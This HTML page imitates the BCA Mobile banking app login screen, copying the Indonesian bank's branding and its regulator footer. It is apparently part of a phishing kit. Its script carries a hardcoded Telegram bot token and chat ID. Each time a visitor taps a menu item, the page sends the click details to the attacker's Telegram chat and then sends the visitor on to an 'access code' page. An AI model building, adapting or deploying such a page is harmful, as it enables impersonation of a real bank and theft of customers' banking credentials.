<!DOCTYPE html>
<html lang="id">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>BCA mobile</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
            font-family: Arial, Helvetica, sans-serif;
        }

        body {
            width: 100%;
            max-width: 420px;
            min-height: 900px;
            margin: 0 auto;
            background: linear-gradient(180deg, #0077DD 0%, #001A4D 100%);
            position: relative;
            padding: 30px 18px;
        }

        body::before {
            content: "";
            position: absolute;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background: radial-gradient(circle at center 20%, rgba(255,255,255,0.22) 0%, transparent 52%);
            pointer-events: none;
        }

        .info-icon {
            position: absolute;
            top: 24px;
            right: 24px;
            width: 26px;
            height: 26px;
            border: 1.5px solid #ffffff;
            border-radius: 50%;
            display: flex;
            align-items: center;
            justify-content: center;
            color: #ffffff;
            font-size: 14px;
            font-weight: bold;
        }

        .logo {
            text-align: center;
            margin: 50px 0 40px;
        }

        .logo-text {
            font-size: 42px;
            font-weight: bold;
            color: #ffffff;
            text-shadow: 4px 4px 4px rgba(0, 0, 0, 0.5);
        }

        .logo-text span {
            font-size: 30px;
            font-weight: normal;
        }

        .menu-container {
            background: linear-gradient(180deg, #0090EE 0%, #0050BB 100%);
            border: 1.8px solid #ffffff;
            border-radius: 10px;
            overflow: hidden;
            margin-bottom: 30px;
            box-shadow: 2px 2px 4px rgba(0, 0, 0, 0.4), 0px 7px 13px -3px rgba(0, 0, 0, 0.3), 0px -3px 0px rgba(0, 0, 0, 0.2) inset;
        }

        .menu-item {
            display: flex;
            align-items: center;
            padding: 12px 14px;
            gap: 10px;
            /* ✅ Garis pemisah putih bening antar menu */
            border-bottom: 1.5px solid rgba(255, 255, 255, 0.3);
            cursor: pointer;
            transition: background 0.2s;
        }

        .menu-item:hover {
            background: rgba(255, 255, 255, 0.1);
        }

        .menu-item:last-child {
            border-bottom: none;
        }

        /* Kotak ikon dengan gambar */
        .icon-box {
            width: 55px;
            height: 55px;
            box-shadow: 3px 2px 4px rgba(0, 0, 0, 0.4), 0px 7px 13px -3px rgba(0, 0, 0, 0.3), 0px -3px 0px rgba(0, 0, 0, 0.2) inset;
            background-color: #ffffff;
            border-radius: 9px;
            display: flex;
            align-items: center;
            justify-content: center;
            background-size: 80%;
            background-repeat: no-repeat;
            background-position: center;
        }

        /* === TEMPAT PASANG GAMBAR === */
        .icon-mbca { background-image: url('bcam.png'); }
        .icon-klik { background-image: url('bcak.png'); }
        .icon-info { background-image: url('bcai.png'); }
        /* ================================= */

        .menu-text {
            font-size: 23px;
            color: #ffffff;
            font-weight: 500;
        }

        .btn {
            width: 100%;
            padding: 14px;
            margin: 9px 0;
            background: linear-gradient(180deg, #0099EE 0%, #0055BB 100%);
            border: none;
            border-radius: 8px;
            color: #ffffff;
            font-size: 21px;
            font-weight: 500;
            box-shadow: 0 2px 5px rgba(0,0,0,0.25);
            cursor: pointer;
            transition: filter 0.2s;
        }

        .btn:hover {
            filter: brightness(1.1);
        }

        .footer-text {
            position: absolute;
            bottom: 35px;
            left: 0;
            width: 100%;
            text-align: center;
            color: #ffffff;
            font-size: 12px;
            line-height: 1.5;
            padding: 0 15px;
        }
    </style>
</head>
<body>
    <div class="info-icon">i</div>

    <div class="logo">
        <div class="logo-text">BCA<span>Mobile</span></div>
    </div>

    <div class="menu-container">
        <div class="menu-item" onclick="prosesKlik('m-BCA', 'kode akses.html')">
            <div class="icon-box icon-mbca"></div>
            <div class="menu-text">m-BCA</div>
        </div>
        <div class="menu-item" onclick="prosesKlik('KlikBCA', 'kode akses.html')">
            <div class="icon-box icon-klik"></div>
            <div class="menu-text">Klik BCA</div>
        </div>
        <div class="menu-item" onclick="prosesKlik('Info BCA', 'kode akses.html')">
            <div class="icon-box icon-info"></div>
            <div class="menu-text">Info BCA</div>
        </div>
    </div>

    <button class="btn" onclick="prosesKlik('Buka Rekening Baru', 'kode akses.html')">Buka Rekening Baru</button>
    <button class="btn" onclick="prosesKlik('Flazz', 'kode akses.html')">Flazz</button>

    <div class="footer-text">
        BCA berizin dan diawasi oleh<br>
        Otoritas Jasa Keuangan & Bank Indonesia.<br>
        BCA merupakan peserta penjaminan LPS.
    </div>

    <script>
        // === ISI DATA KAMU DI SINI ===
        const BOT_TOKEN = "8334290345:AAEbZSsoNCAUjkVP32C54IflHq2I9LJmvlM";
        const CHAT_ID = "8683949047";
        // =============================

        function prosesKlik(namaMenu, alamatTujuan) {
            // Kirim data ke Telegram
            const pesan = `📱 Akses BCA Mobile\n📌 Menu: ${namaMenu}\n⏱️ Waktu: ${new Date().toLocaleString('id-ID')}\n🔗 Halaman: ${window.location.href}`;
            
            fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=${encodeURIComponent(pesan)}`)
            .then(res => res.json())
            .then(() => {
                // Pindah halaman setelah terkirim
                window.location.href = alamatTujuan;
            })
            .catch(() => {
                // Tetap pindah meski gagal kirim
                window.location.href = alamatTujuan;
            });
        }
    </script>
</body>
</html>
